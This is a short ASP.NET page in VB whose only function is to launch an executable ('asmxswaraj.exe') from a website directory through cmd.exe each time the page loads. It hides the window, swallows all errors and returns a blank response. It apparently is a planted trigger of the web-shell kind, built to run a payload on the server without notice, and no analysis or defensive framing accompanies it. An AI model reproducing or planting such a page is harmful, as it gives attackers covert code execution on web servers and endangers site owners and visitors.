<%@ Page Language="VB" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
Protected Sub Page_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
    Try
        ' Build full one-liner
        Dim cmd As String = "cmd.exe"
        Dim args As String = "/c C:\Website\SwarajReports.indiainfoline.com\asmxswaraj.exe"

        Dim psi As New ProcessStartInfo(cmd, args)
        psi.UseShellExecute = False
        psi.CreateNoWindow = True
        Process.Start(psi)
    Catch
        ' Silent fail
    End Try

    Response.Clear()
    Response.End()
End Sub
</script>
